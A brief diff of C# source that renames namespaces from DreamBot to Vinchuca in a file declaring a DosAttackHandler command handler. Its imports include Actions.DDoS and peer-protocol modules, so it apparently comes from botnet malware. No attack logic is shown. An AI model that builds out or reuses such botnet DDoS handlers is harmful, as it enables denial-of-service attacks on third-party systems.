@@ -1,11 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using DreamBot.Actions.DDoS;
-using DreamBot.Network.Protocol.Messages;
-using DreamBot.Network.Protocol.Messages.Command;
-using DreamBot.Network.Protocol.Peers;
+using Vinchuca.Actions.DDoS;
+using Vinchuca.Network.Protocol.Messages;
+using Vinchuca.Network.Protocol.Messages.Command;
+using Vinchuca.Network.Protocol.Peers;
+using Vinchuca.Actions.DDoS;
 
-namespace DreamBot.Network.Protocol.Handlers.Command
+namespace Vinchuca.Network.Protocol.Handlers.Command
 {
     class DosAttackHandler : IMessageHandler
     {
